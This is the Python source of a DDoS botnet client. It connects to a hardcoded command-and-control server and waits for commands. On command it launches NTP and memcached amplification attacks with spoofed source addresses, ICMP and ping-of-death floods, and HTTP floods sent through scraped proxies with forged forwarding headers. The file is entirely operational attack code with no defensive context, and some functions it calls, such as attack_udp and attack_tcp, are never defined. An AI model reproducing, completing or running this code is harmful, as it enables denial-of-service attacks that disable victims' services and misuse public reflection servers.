import socket
import threading
import time
import random
import requests
import struct
import os
import socks
import ssl
import cloudscraper
from scapy.all import IP, UDP, Raw, ICMP, send
from icmplib import ping as pig
from urllib.parse import urlparse
from multiprocessing import Process

# Update C2 Host dan Port sesuai dengan yang Anda tentukan
C2Host = "178.128.51.255"  # Ganti dengan IP atau domain server C2 Anda
C2Port = 22  # Ganti dengan port yang sesuai

base_user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
]

def rand_ua():
    return random.choice(base_user_agents)

ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def ntp_attack(target, port, duration):
    with open("ntpServers.txt", "r") as f:
        ntp_servers = [server.strip() for server in f.readlines()]
    
    end_time = time.time() + duration
    packets = random.randint(10, 150)
    
    while time.time() < end_time:
        server = random.choice(ntp_servers)
        packet = IP(dst=server, src=target) / UDP(sport=random.randint(1, 65535), dport=port) / Raw(load=ntp_payload)
        send(packet, count=packets, verbose=False)

mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def memcached_attack(target, port, duration):
    with open("memsv.txt", "r") as f:
        mem_servers = [server.strip() for server in f.readlines()]

    end_time = time.time() + duration
    packets = random.randint(1024, 60000)

    while time.time() < end_time:
        server = random.choice(mem_servers)
        packet = IP(dst=server, src=target) / UDP(sport=port, dport=11211) / Raw(load=mem_payload)
        send(packet, count=packets, verbose=False)

def icmp_flood(target, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        packet = random._urandom(random.randint(1024, 60000))
        pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)

def pod_attack(target, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        rand_addr = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        ip_hdr = IP(src=rand_addr, dst=target)
        packet = ip_hdr / ICMP() / ("m" * 60000)
        send(packet, verbose=False)

def http_spoof_attack(url, duration):
    timeout = time.time() + duration
    proxies = open("socks4.txt").readlines()
    proxy = random.choice(proxies).strip().split(":")
    headers = {
        "Host": urlparse(url).netloc,
        "User-Agent": rand_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "X-Forwarded-Proto": "http",
        "X-Forwarded-Host": f"{urlparse(url).netloc}, 1.1.1.1",
        "Via": f"{random.choice(proxies)}",
        "Client-IP": f"{random.choice(proxies)}",
        "X-Forwarded-For": f"{random.choice(proxies)}",
        "Real-IP": f"{random.choice(proxies)}",
        "Connection": "Keep-Alive"
    }
    
    while time.time() < timeout:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
            s.connect((urlparse(url).netloc, 443))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(f"GET / HTTP/1.1\r\n".encode() + "\r\n".join(f"{k}: {v}" for k, v in headers.items()).encode() + b"\r\n\r\n")
        except:
            pass
        finally:
            s.close()

# Updated attack runner to handle new types
def run_attack(target, duration, attack_type="http"):
    proxies = []

    if attack_type == "http" or attack_type == "cfb":
        cfbp = 1 if attack_type == "cfb" else 0
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = list(set(proxyscrape_http.text.splitlines() + proxy_list_http.text.splitlines() + raw_github_http.text.splitlines()))
        except:
            pass
    
    threads = []
    for _ in range(50):  # Number of threads
        if attack_type == "http":
            t = threading.Thread(target=http_spoof_attack, args=(target, duration))
        elif attack_type == "cfb":
            t = threading.Thread(target=http_spoof_attack, args=(target, duration))
        else:
            t = threading.Thread(target=icmp_flood, args=(target, duration))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

# Entry point
def main():
    while True:
        # Connect to C2 server
        try:
            c2 = socket.create_connection((C2Host, C2Port))
            c2.sendall(b'BOT_READY')

            while True:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break

                args = data.split(' ')
                command = args[0].upper()

                if command == '.UDP':
                    target, port, duration = args[1], int(args[2]), int(args[3])
                    size = int(args[4]) if len(args) > 4 else 1024
                    threading.Thread(target=attack_udp, args=(target, port, duration, size)).start()
                
                elif command == '.TCP':
                    target, port, duration = args[1], int(args[2]), int(args[3])
                    size = int(args[4]) if len(args) > 4 else 1024
                    threading.Thread(target=attack_tcp, args=(target, port, duration, size)).start()

                elif command == '.NTP':
                    target, port, duration = args[1], int(args[2]), int(args[3])
                    threading.Thread(target=ntp_attack, args=(target, port, duration)).start()

                elif command == '.MEM':
                    target, port, duration = args[1], int(args[2]), int(args[3])
                    threading.Thread(target=memcached_attack, args=(target, port, duration)).start()

                elif command == '.ICMP':
                    target, duration = args[1], int(args[2])
                    threading.Thread(target=icmp_flood, args=(target, duration)).start()

                elif command == '.POD':
                    target, duration = args[1], int(args[2])
                    threading.Thread(target=pod_attack, args=(target, duration)).start()
                
                elif command == '.HTTP':
                    target, duration, attack_type = args[1], int(args[2]), args[3]
                    run_attack(target, duration, attack_type)

        except Exception as e:
            print(f"Connection to C2 failed: {e}")
            time.sleep(5)
            continue

if __name__ == "__main__":
    main()
